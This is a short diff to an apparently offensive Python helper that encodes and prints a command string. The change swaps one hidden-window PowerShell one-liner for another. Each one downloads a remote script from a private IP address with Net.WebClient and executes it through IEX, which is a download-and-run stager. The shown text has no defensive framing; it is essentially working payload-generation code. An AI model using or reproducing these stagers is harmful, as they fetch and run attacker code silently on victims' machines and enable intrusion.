@@ -7,7 +7,8 @@ def encString(strencoded):
     return newString
 
 def main():
-    encStr = encString("powershell -WindowStyle Hidden \"IEX(New-Object Net.WebClient).downloadString('http://192.168.1.64:8080/test.ps1')\"")
+    #encStr = encString("powershell -Command ")
+    encStr = encString("powershell -WindowStyle Hidden \"IEX(New-Object Net.WebClient).downloadString('http://192.168.10.128/pa_files/test.ps1')\"")
     print(encStr)
 
 
